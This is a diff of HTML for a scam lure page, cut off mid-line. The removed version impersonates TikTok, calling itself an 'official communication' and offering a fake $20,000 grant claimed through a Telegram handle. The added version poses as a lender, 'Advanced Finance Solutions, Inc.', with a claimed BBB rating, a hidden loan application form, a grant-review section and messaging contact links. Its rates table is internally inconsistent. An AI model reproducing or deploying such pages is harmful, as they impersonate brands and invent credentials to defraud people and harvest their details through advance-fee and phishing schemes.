@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TikTok Creator Excellence Program</title>
+  <title>Advanced Finance Solutions, Inc. - Quick Loan Program</title>
   <style>
     * {
       margin: 0;
@@ -14,74 +13,66 @@
 
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      background: linear-gradient(135deg, #003d66 0%, #004d80 100%);
       min-height: 100vh;
-      padding: 5px;
+      padding: 0;
       position: relative;
+      overflow-x: hidden;
     }
 
     .email-container {
-      max-width: 600px;
-      margin: 10px auto;
+      max-width: 100%;
+      margin: 0;
       background: #ffffff;
-      border-radius: 12px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      border-radius: 0;
+      box-shadow: none;
       overflow: hidden;
       animation: slideUp 0.6s ease-out;
       position: relative;
+      min-height: 100vh;
     }
 
     @keyframes slideUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .verification-badge {
+    .official-badge {
       position: absolute;
-      top: 10px;
-      right: 10px;
-      background: linear-gradient(135deg, #00D4FF, #0099CC);
+      top: 8px;
+      right: 8px;
+      background: linear-gradient(135deg, #00a86b, #008055);
       color: white;
-      padding: 4px 10px;
+      padding: 4px 12px;
       border-radius: 20px;
       font-size: 10px;
       font-weight: bold;
       z-index: 10;
       display: flex;
       align-items: center;
-      gap: 5px;
-      animation: shimmer 2s infinite;
+      gap: 4px;
+      animation: pulse 2s infinite;
+      letter-spacing: 0.5px;
     }
 
-    @keyframes shimmer {
-
-      0%,
-      100% {
-        opacity: 1;
-      }
-
-      50% {
-        opacity: 0.8;
-      }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.8; }
     }
 
     .header {
-      background: linear-gradient(135deg, #010101 0%, #2a2a2a 100%);
-      padding: 12px;
+      background: linear-gradient(135deg, #003366 0%, #004d99 100%);
+      padding: 20px 15px;
       text-align: center;
       position: relative;
       overflow: hidden;
-      height: 80px;
+      min-height: 100px;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
+      width: 100%;
+      border-bottom: 3px solid #ffaa00;
     }
 
     .header::before {
@@ -91,616 +82,480 @@
       left: -50%;
       width: 200%;
       height: 200%;
-      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
       transform: rotate(45deg);
-      animation: shimmer 3s infinite;
+      animation: shimmer 6s infinite;
     }
 
     @keyframes shimmer {
-      0% {
-        transform: translateX(-100%) translateY(-100%) rotate(45deg);
-      }
-
-      100% {
-        transform: translateX(100%) translateY(100%) rotate(45deg);
-      }
+      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
     }
 
-    .header img {
-      width: 50px;
-      filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
-      animation: pulse 2s infinite;
+    .header-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      position: relative;
+      z-index: 2;
     }
 
-    @keyframes pulse {
+    .logo {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #ffaa00, #ffc34d);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: bold;
+      color: #003366;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      margin-bottom: 5px;
+      border: 3px solid white;
+    }
 
-      0%,
-      100% {
-        transform: scale(1);
-      }
+    .header-text {
+      color: white;
+      text-align: center;
+    }
 
-      50% {
-        transform: scale(1.05);
-      }
+    .header-text h1 {
+      font-size: 22px;
+      margin-bottom: 4px;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .header-text p {
+      font-size: 14px;
+      opacity: 0.95;
+      font-weight: 300;
+    }
+
+    .trust-badge {
+      display: inline-block;
+      background: rgba(255,255,255,0.15);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      margin-top: 6px;
+      border: 1px solid rgba(255,255,255,0.3);
     }
 
     .content {
       padding: 20px;
-      background: linear-gradient(to bottom, #ffffff, #f8f9fa);
+      background: linear-gradient(to bottom, #ffffff, #f5f8ff);
+      min-height: calc(100vh - 100px - 60px);
     }
 
-    .title {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 8px;
-      line-height: 1.2;
-      color: #333;
-    }
-
-    .highlight {
-      background: linear-gradient(135deg, #25F4EE, #00d4cc);
-      color: #010101 !important;
-      padding: 4px 10px;
-      border-radius: 20px;
-      font-weight: bold;
-      display: inline-block;
-      box-shadow: 0 4px 15px rgba(37, 244, 238, 0.3);
-      animation: glow 2s ease-in-out infinite;
-      -webkit-text-fill-color: #010101 !important;
-      position: relative;
-      z-index: 1;
-      font-size: 16px;
-    }
-
-    @keyframes glow {
-
-      0%,
-      100% {
-        box-shadow: 0 4px 15px rgba(37, 244, 238, 0.3);
-      }
-
-      50% {
-        box-shadow: 0 4px 25px rgba(37, 244, 238, 0.6);
-      }
-    }
-
-    .reward-info {
-      margin-top: 12px;
-      font-size: 13px;
-      color: #333;
-      padding: 10px;
-      background: linear-gradient(135deg, #fff5f5, #ffe0e0);
-      border-radius: 10px;
-      border-left: 4px solid #FE2C55;
-    }
-
-    .btn {
-      display: inline-block;
-      margin-top: 12px;
-      background: linear-gradient(135deg, #FE2C55, #e42047);
-      color: white;
-      padding: 10px 20px;
-      text-decoration: none;
-      border-radius: 25px;
-      font-weight: bold;
-      font-size: 13px;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
-    }
-
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4);
-    }
-
-    .footer {
-      background: linear-gradient(135deg, #f0f0f0, #e8e8e8);
-      padding: 12px;
-      font-size: 10px;
-      color: #777;
-      text-align: center;
-    }
-
-    ul {
-      margin: 12px 0;
-      padding-left: 20px;
-    }
-
-    ul li {
-      margin: 4px 0;
-      color: #555;
-      font-size: 13px;
-      position: relative;
-      padding-left: 10px;
-    }
-
-    .reveal-section {
-      background: linear-gradient(135deg, #ffffff, #f9f9f9);
-      color: #000;
+    .welcome-section {
+      background: linear-gradient(135deg, #e6f2ff, #cce6ff);
       padding: 20px;
       border-radius: 15px;
-      margin-top: 15px;
+      margin-bottom: 20px;
+      text-align: center;
+      border-left: 5px solid #ffaa00;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+    }
+
+    .welcome-section h2 {
+      color: #003366;
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+
+    .welcome-section p {
+      color: #004d80;
+      font-size: 16px;
+      line-height: 1.5;
+    }
+
+    .loan-types {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+
+    .loan-type {
+      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+      padding: 12px 8px;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: bold;
+      color: #003366;
+      font-size: 14px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+      border: 1px solid #dee2e6;
+      transition: transform 0.2s;
+    }
+
+    .loan-type:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0,51,102,0.15);
+    }
+
+    .loan-type span {
+      display: block;
+      font-size: 18px;
+      margin-bottom: 4px;
+    }
+
+    .rates-table {
+      background: white;
+      border-radius: 15px;
+      padding: 15px;
+      margin: 20px 0;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      border: 1px solid #e0e0e0;
+    }
+
+    .rates-table h3 {
+      color: #003366;
+      margin-bottom: 15px;
+      text-align: center;
+      font-size: 18px;
+      border-bottom: 2px solid #ffaa00;
+      padding-bottom: 8px;
+    }
+
+    .rate-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px dashed #dee2e6;
+    }
+
+    .rate-item:last-child {
+      border-bottom: none;
+    }
+
+    .loan-amount {
+      font-weight: bold;
+      color: #003366;
+    }
+
+    .monthly-payment {
+      color: #00a86b;
+      font-weight: bold;
+    }
+
+    .term {
+      color: #6c757d;
+      font-size: 13px;
+    }
+
+    .feature-badge {
+      background: linear-gradient(135deg, #ffaa00, #ffc34d);
+      color: #003366;
+      padding: 8px 15px;
+      border-radius: 25px;
+      font-weight: bold;
+      display: inline-block;
+      margin: 10px 0;
+      font-size: 14px;
+    }
+
+    .action-section {
+      background: linear-gradient(135deg, #ffffff, #f9f9f9);
+      color: #000;
+      padding: 25px;
+      border-radius: 20px;
+      margin: 25px 0;
       text-align: center;
       position: relative;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 6px 25px rgba(0,51,102,0.15);
       overflow: hidden;
+      border: 2px solid #ffaa00;
     }
 
-    .reveal-section::before {
+    .action-section::before {
       content: '';
-      position: absolute;
-      top: -2px;
-      left: -2px;
-      right: -2px;
-      bottom: -2px;
-      background: linear-gradient(45deg, #FE2C55, #25F4EE, #FE2C55);
-      border-radius: 15px;
-      opacity: 0.3;
-      z-index: -1;
-      animation: borderRotate 3s linear infinite;
-    }
-
-    @keyframes borderRotate {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    .reveal-btn {
-      background: linear-gradient(135deg, #FE2C55, #e42047);
-      color: #fff;
-      padding: 10px 25px;
-      border: none;
-      border-radius: 25px;
-      font-size: 14px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
-      position: relative;
-      overflow: hidden;
-    }
-
-    .reveal-btn::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      background: rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      transform: translate(-50%, -50%);
-      transition: width 0.6s, height 0.6s;
-    }
-
-    .reveal-btn:hover::before {
-      width: 300px;
-      height: 300px;
-    }
-
-    .reveal-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(254, 44, 85, 0.4);
-    }
-
-    .reward-text {
-      display: none;
-      margin-top: 12px;
-      font-size: 16px;
-      font-weight: bold;
-      color: #FE2C55;
-      animation: fadeInScale 0.5s ease-out;
-      padding: 12px;
-      background: linear-gradient(135deg, #fff5f5, #ffe0e0);
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(254, 44, 85, 0.2);
-    }
-
-    @keyframes fadeInScale {
-      from {
-        opacity: 0;
-        transform: scale(0.9);
-      }
-
-      to {
-        opacity: 1;
-        transform: scale(1);
-      }
-    }
-
-    .confetti {
       position: absolute;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #003366, #ffaa00, #003366);
+      animation: progress 3s linear infinite;
     }
 
-    .contact-links {
+    @keyframes progress {
+      0% { background-position: -200px 0; }
+      100% { background-position: 200px 0; }
+    }
+
+    .action-btn {
+      background: linear-gradient(135deg, #003366, #004d99);
+      color: white;
+      padding: 16px 32px;
+      border: none;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(0,51,102,0.3);
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      max-width: 350px;
+      display: block;
+      margin: 15px auto;
+      letter-spacing: 0.5px;
+    }
+
+    .action-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 20px rgba(0,51,102,0.4);
+    }
+
+    .action-btn.secondary {
+      background: linear-gradient(135deg, #00a86b, #008055);
+    }
+
+    .action-btn.tertiary {
+      background: linear-gradient(135deg, #ffaa00, #ffc34d);
+      color: #003366;
+    }
+
+    .application-form {
+      background: white;
+      border-radius: 20px;
+      padding: 25px;
+      margin: 20px 0;
+      box-shadow: 0 6px 20px rgba(0,51,102,0.15);
+      border: 2px solid #ffaa00;
       display: none;
-      margin-top: 12px;
-      animation: fadeInScale 0.5s ease-out;
+    }
+
+    .form-title {
+      color: #003366;
+      font-size: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+      color: #003366;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .form-group input,
+    .form-group select,
+    .form-group textarea {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #e0e0e0;
+      border-radius: 10px;
+      font-size: 14px;
+      transition: all 0.3s;
+      background: #f8f9fa;
+    }
+
+    .form-group input:focus,
+    .form-group select:focus,
+    .form-group textarea:focus {
+      border-color: #ffaa00;
+      outline: none;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(255,170,0,0.1);
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .loan-calculator {
+      background: linear-gradient(135deg, #e6f2ff, #cce6ff);
+      padding: 15px;
+      border-radius: 10px;
+      margin: 15px 0;
+    }
+
+    .calculator-result {
+      background: white;
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .calculator-result span {
+      color: #00a86b;
+      font-size: 24px;
+      font-weight: bold;
+    }
+
+    .grant-review {
+      display: none;
+      background: linear-gradient(135deg, #e6f2ff, #cce6ff);
+      padding: 25px;
+      border-radius: 20px;
+      margin: 20px 0;
+      text-align: center;
+      border: 3px solid #ffaa00;
+    }
+
+    .grant-amount {
+      font-size: 36px;
+      color: #003366;
+      font-weight: bold;
+      margin: 15px 0;
+      text-shadow: 0 2px 10px rgba(255,170,0,0.3);
+    }
+
+    .grant-details {
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 15px 0;
+    }
+
+    .contact-section {
+      display: none;
+      margin-top: 20px;
+      padding: 25px;
+      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+      border-radius: 20px;
+      border: 2px solid #ffaa00;
     }
 
     .contact-header {
-      font-size: 14px;
-      color: #333;
-      margin-bottom: 8px;
+      font-size: 20px;
+      color: #003366;
+      margin-bottom: 20px;
       font-weight: bold;
+      text-align: center;
     }
 
     .contact-options {
       display: flex;
       flex-direction: column;
-      gap: 8px;
-      margin-top: 8px;
+      gap: 15px;
+      margin-top: 15px;
     }
 
     .contact-option {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
-      padding: 8px 16px;
-      background: linear-gradient(135deg, #25F4EE, #00d4cc);
+      gap: 10px;
+      padding: 16px 24px;
+      background: linear-gradient(135deg, #003366, #004d99);
       color: white;
       text-decoration: none;
-      border-radius: 25px;
+      border-radius: 40px;
       font-weight: bold;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(37, 244, 238, 0.3);
-      font-size: 13px;
+      box-shadow: 0 3px 12px rgba(0,51,102,0.3);
+      font-size: 16px;
+      border: 1px solid rgba(255,255,255,0.2);
     }
 
     .contact-option:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(37, 244, 238, 0.4);
+      transform: translateY(-3px);
+      box-shadow: 0 6px 18px rgba(0,51,102,0.4);
       color: white;
     }
 
     .contact-option.telegram {
       background: linear-gradient(135deg, #0088cc, #006699);
-      box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3);
     }
 
-    .contact-option.telegram:hover {
-      box-shadow: 0 6px 20px rgba(0, 136, 204, 0.4);
-    }
-
-    .contact-option.outlook {
-      background: linear-gradient(135deg, #0072c6, #005a9e);
-      box-shadow: 0 4px 15px rgba(0, 114, 198, 0.3);
-    }
-
-    .contact-option.outlook:hover {
-      box-shadow: 0 6px 20px rgba(0, 114, 198, 0.4);
+    .contact-option.email {
+      background: linear-gradient(135deg, #00a86b, #008055);
     }
 
     .contact-icon {
-      width: 18px;
-      height: 18px;
+      width: 24px;
+      height: 24px;
       filter: brightness(0) invert(1);
     }
 
-    .contact-note {
-      margin-top: 8px;
-      font-size: 11px;
-      color: #666;
-      font-style: italic;
-    }
-
-    .security-warning {
-      margin-top: 8px;
-      padding: 6px 10px;
+    .security-notice {
+      margin-top: 20px;
+      padding: 15px;
       background: linear-gradient(135deg, #fff3cd, #ffeaa7);
-      border-left: 4px solid #ffc107;
-      border-radius: 8px;
-      font-size: 11px;
+      border-radius: 12px;
+      border-left: 4px solid #ffaa00;
+      font-size: 13px;
       color: #856404;
+      line-height: 1.5;
       text-align: left;
     }
 
-    .claim-btn {
-      background: linear-gradient(135deg, #FFD700, #FFA500);
-      color: #333;
-      padding: 10px 25px;
-      border: none;
-      border-radius: 25px;
-      font-size: 14px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
-      position: relative;
-      overflow: hidden;
-      display: none;
-    }
-
-    .claim-btn::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      background: rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      transform: translate(-50%, -50%);
-      transition: width 0.6s, height 0.6s;
-    }
-
-    .claim-btn:hover::before {
-      width: 300px;
-      height: 300px;
-    }
-
-    .claim-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(255, 215, 0, 0.4);
-    }
-
-    #social-proof {
-      position: fixed;
-      bottom: 10px;
-      left: 10px;
-      background: linear-gradient(135deg, #ffffff, #f8f9fa);
-      color: #333;
-      padding: 8px 12px;
-      border-radius: 10px;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      font-size: 11px;
-      z-index: 1000;
-      transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-      max-width: 250px;
-      border-left: 4px solid #FE2C55;
-      position: relative;
-    }
-
-    #social-proof::before {
-      content: '🔔';
-      margin-right: 8px;
-      animation: bellRing 1s ease-in-out infinite;
-    }
-
-    #social-proof.creator-popup::before {
-      content: '⭐';
-    }
-
-    #social-proof::after {
-      content: '';
-      position: absolute;
-      top: 10px;
-      right: 10px;
-      width: 8px;
-      height: 8px;
-      background: #25F4EE;
-      border-radius: 50%;
-      animation: pulseDot 2s infinite;
-    }
-
-    @keyframes pulseDot {
-
-      0%,
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-
-      50% {
-        transform: scale(1.5);
-        opacity: 0.5;
-      }
-    }
-
-    @keyframes bellRing {
-
-      0%,
-      100% {
-        transform: rotate(0deg);
-      }
-
-      25% {
-        transform: rotate(10deg);
-      }
-
-      75% {
-        transform: rotate(-10deg);
-      }
-    }
-
-    .hidden {
-      opacity: 0;
-      transform: translateX(-100%);
-      pointer-events: none;
-    }
-
-    .visible {
-      opacity: 1;
-      transform: translateX(0);
-    }
-
-    #top-creator-popup {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      background: linear-gradient(135deg, #FE2C55, #e42047);
-      color: white;
-      padding: 12px;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(254, 44, 85, 0.4);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-      font-size: 12px;
-      z-index: 1001;
-      transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-      max-width: 280px;
-      border: 2px solid #25F4EE;
-    }
-
-    #top-creator-popup::before {
-      content: '🏆';
-      margin-right: 8px;
-      font-size: 16px;
-    }
-
-    .creator-name {
-      font-weight: bold;
-      color: #25F4EE;
-      text-shadow: 0 0 10px rgba(37, 244, 238, 0.5);
-    }
-
-    .reward-amount {
-      font-size: 14px;
-      font-weight: bold;
-      margin-top: 4px;
-    }
-
     .loading-spinner {
-      width: 14px;
-      height: 14px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      border-top-color: white;
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
       border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-left: 8px;
-      display: none;
-      vertical-align: middle;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+      margin-left: 10px;
     }
 
     @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
+      to { transform: rotate(360deg); }
     }
 
-    .legal-disclaimer {
+    .disclaimer {
+      font-size: 11px;
+      color: #6c757d;
       margin-top: 15px;
-      padding: 10px;
-      background: #f8f9fa;
-      border-radius: 8px;
-      font-size: 10px;
-      color: #666;
+      text-align: center;
       line-height: 1.4;
     }
 
-    .security-notice {
-      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
-      padding: 8px;
-      border-radius: 8px;
-      margin: 10px 0;
-      display: flex;
-      align-items: center;
-      gap: 6px;
+    .footer {
+      background: linear-gradient(135deg, #003366, #002b4d);
+      padding: 15px;
       font-size: 12px;
+      color: #ffffff;
+      text-align: center;
+      position: relative;
+      bottom: 0;
+      width: 100%;
+      border-top: 3px solid #ffaa00;
     }
 
-    .security-notice::before {
-      content: '🔒';
-      font-size: 14px;
+    .footer a {
+      color: #ffaa00;
+      text-decoration: none;
     }
 
-    .terms-link {
-      color: #666;
-      text-decoration: underline;
+    /* Responsive adjustments */
+    @media (max-width: 375px) {
+      .content { padding: 15px; }
+      .loan-types { grid-template-columns: 1fr; }
+      .form-row { grid-template-columns: 1fr; }
+      .header-text h1 { font-size: 18px; }
+      .logo { width: 60px; height: 60px; font-size: 24px; }
+      .grant-amount { font-size: 28px; }
     }
 
-    .terms-link:hover {
-      color: #FE2C55;
-    }
-
-    .title-part {
-      background: linear-gradient(135deg, #FE2C55, #ff4d7d);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .shopper-badge {
-      display: inline-block;
-      background: linear-gradient(135deg, #FFD700, #FFA500);
-      color: #fff;
-      padding: 2px 6px;
-      border-radius: 10px;
-      font-size: 9px;
-      font-weight: bold;
-      margin-left: 4px;
-      animation: shimmer 2s infinite;
-    }
-
-    .mega-reward {
-      background: linear-gradient(135deg, #FFD700, #FF6B6B);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      font-size: 18px;
-      font-weight: bold;
-      text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
-    }
-
-    @media (max-width: 640px) {
-      .email-container {
-        margin: 5px;
-        border-radius: 10px;
-      }
-
-      .content {
-        padding: 15px;
-      }
-
-      .title {
-        font-size: 18px;
-      }
-
-      .highlight {
-        font-size: 14px;
-      }
-
-      .reveal-section {
-        padding: 15px;
-      }
-
-      #social-proof {
-        bottom: 5px;
-        left: 5px;
-        right: 5px;
-        max-width: none;
-        font-size: 10px;
-      }
-
-      #top-creator-popup {
-        top: 5px;
-        right: 5px;
-        left: 5px;
-        max-width: none;
-        font-size: 11px;
-      }
-
-      .contact-option {
-        padding: 8px 12px;
-        font-size: 12px;
-      }
-
-      .header {
-        height: 70px;
-        padding: 8px;
-      }
-
-      .header img {
-        width: 40px;
-      }
-
-      .footer {
-        padding: 8px;
-        font-size: 9px;
+    @supports (padding: max(0px)) {
+      body {
+        padding-left: max(0px, env(safe-area-inset-left));
+        padding-right: max(0px, env(safe-area-inset-right));
+        padding-top: max(0px, env(safe-area-inset-top));
+        padding-bottom: max(0px, env(safe-area-inset-bottom));
       }
     }
   </style>
@@ -708,345 +563,429 @@
 
 <body>
   <div class="email-container">
-    <div class="verification-badge">
-      ✅ Verified Sender
+    <div class="official-badge">
+      ⚡ FAST APPROVAL • LOW INTEREST
     </div>
 
     <div class="header">
-      <img src="https://images.macrumors.com/t/RKe-ihkRY_z5uXNYZSPfUNnvjbc=/1600x/article-new/2020/08/tiktok-logo.jpg" alt="TikTok Logo" />
+      <div class="header-content">
+        <div class="logo">AFS</div>
+        <div class="header-text">
+          <h1>ADVANCED FINANCE SOLUTIONS, INC.</h1>
+          <p>Your Trusted Lending Partner Since 2010</p>
+          <div class="trust-badge">🏆 BBB RATED A+ • 50,000+ HAPPY CLIENTS</div>
+        </div>
+      </div>
     </div>
 
     <div class="content">
-      <p class="title">
-        <span class="title-part">🎉Congratulations! You've Been Selected for the </span><br>
-        <span class="highlight">TikTok Creators | Tiktok shoppers Excellence Program</span>
-        <span class="shopper-badge">+ Shoppers</span>
-      </p>
-
-      <p>Dear <strong>users</strong>,</p>
-
-      <p>You've been selected for the <strong>Creator Excellence Program</strong>. Awarded to creators and
-        <strong>TikTok Shoppers</strong> with exceptional content quality, community engagement, and platform
-        contribution.
-      </p>
-
-      <div class="security-notice">
-        This is an official communication from TikTok. Your account is protected with industry-standard encryption.
+      <div class="welcome-section">
+        <h2>🚀 Welcome to Advanced Finance Solutions, Inc.!</h2>
+        <p>Get your quick loan now with low interest rates. Funds deposited within 24 hours of approval!</p>
       </div>
 
-      <ul>
-        <li>✅ Verified active creator</li>
-        <li>✅ Strong engagement metrics</li>
-        <li>✅ Positive platform contribution</li>
-        <li>✅ Active TikTok Shop participant</li>
-        <li>✅ Guidelines compliant</li>
-      </ul>
-
-      <div class="reward-info">
-        🎁 <strong>Benefits:</strong> Exclusive rewards, promotional opportunities, and monetary recognition based on
-        contribution level. TikTok Shoppers receive additional bonus rewards.
+      <div style="text-align: center; margin: 10px 0;">
+        <span class="feature-badge">✓ NO HIDDEN FEES ✓ FLEXIBLE TERMS ✓ INSTANT DECISION</span>
       </div>
 
-      <!-- Reveal Section -->
-      <div class="reveal-section">
-        <canvas class="confetti"></canvas>
+      <!-- Loan Types Grid -->
+      <div class="loan-types">
+        <div class="loan-type"><span>🏢</span> Business Loan</div>
+        <div class="loan-type"><span>🏠</span> House Loan</div>
+        <div class="loan-type"><span>🏥</span> Hospital Loan</div>
+        <div class="loan-type"><span>📚</span> School Loan</div>
+        <div class="loan-type"><span>🚨</span> Emergency Loan</div>
+        <div class="loan-type"><span>🎄</span> Christmas Loan</div>
+        <div class="loan-type"><span>💼</span> Salary Loan</div>
+        <div class="loan-type"><span>✈️</span> Visa Loan</div>
+      </div>
 
-        <button class="reveal-btn" onclick="revealReward()" id="viewRewardBtn">
-                    View Your Reward <span class="loading-spinner" id="viewSpinner"></span>
-                </button>
-
-        <div class="reward-text" id="rewardText">
-          💰 You've qualified for a
-          <strong><span class="mega-reward">$20,000</span> Grant</strong><br>
-          <small>Available for immediate claim</small><br>
-          <small>🛍️ Plus TikTok Shop bonus!</small>
+      <!-- Loan Rates Table -->
+      <div class="rates-table">
+        <h3>📊 LOAN RATES & MONTHLY PAYMENTS</h3>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$10,000 Loan</span>
+          <span class="monthly-payment">$900/month</span>
+          <span class="term">12 months</span>
         </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$15,000 Loan</span>
+          <span class="monthly-payment">$1,350/month</span>
+          <span class="term">12 months</span>
+        </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$20,000 Loan</span>
+          <span class="monthly-payment">$1,800/month</span>
+          <span class="term">12 months</span>
+        </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$30,000 Loan</span>
+          <span class="monthly-payment">$2,700/month</span>
+          <span class="term">12 months</span>
+        </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$50,000 Loan</span>
+          <span class="monthly-payment">$2,350/month</span>
+          <span class="term">24 months</span>
+        </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$100,000 Loan</span>
+          <span class="monthly-payment">$3,150/month</span>
+          <span class="term">36 months</span>
+        </div>
+        
+        <div class="rate-item">
+          <span class="loan-amount">$200,000 Loan</span>
+          <span class="monthly-payment">$6,300/month</span>
+          <span class="term">36 months</span>
+        </div>
+        
+        <p style="text-align: center; margin-top: 15px; color: #00a86b; font-weight: bold;">
+          * APR as low as 5.99% • No prepayment penalties
+        </p>
+      </div>
 
-        <button class="claim-btn" onclick="revealContactLinks()" id="claimRewardBtn">
-                    Claim Your Reward <span class="loading-spinner" id="claimSpinner"></span>
-                </button>
+      <!-- Main Action Section -->
+      <div class="action-section">
+        <h3 style="color: #003366; margin-bottom: 15px;">🔍 Check Your Loan Eligibility</h3>
+        <p style="margin-bottom: 20px; color: #666;">Complete a quick application to see how much you qualify for</p>
+        
+        <!-- Check Eligibility Button -->
+        <button class="action-btn" onclick="showApplication()" id="eligibilityBtn">
+          ✓ CHECK LOAN ELIGIBILITY STATUS
+        </button>
+      </div>
 
-        <div class="contact-links" id="contactLinks">
-          <p class="contact-header">Contact us to claim your $20,000 reward:</p>
+      <!-- Application Form (Hidden Initially) -->
+      <div class="application-form" id="applicationForm">
+        <h3 class="form-title">📝 QUICK LOAN APPLICATION</h3>
+        <p style="text-align: center; margin-bottom: 20px; color: #003366;">Complete the form to verify your eligibility</p>
 
-          <div class="contact-options">
-            <a href="https://t.me/titokcreatorsreward" class="contact-option telegram" target="_blank">
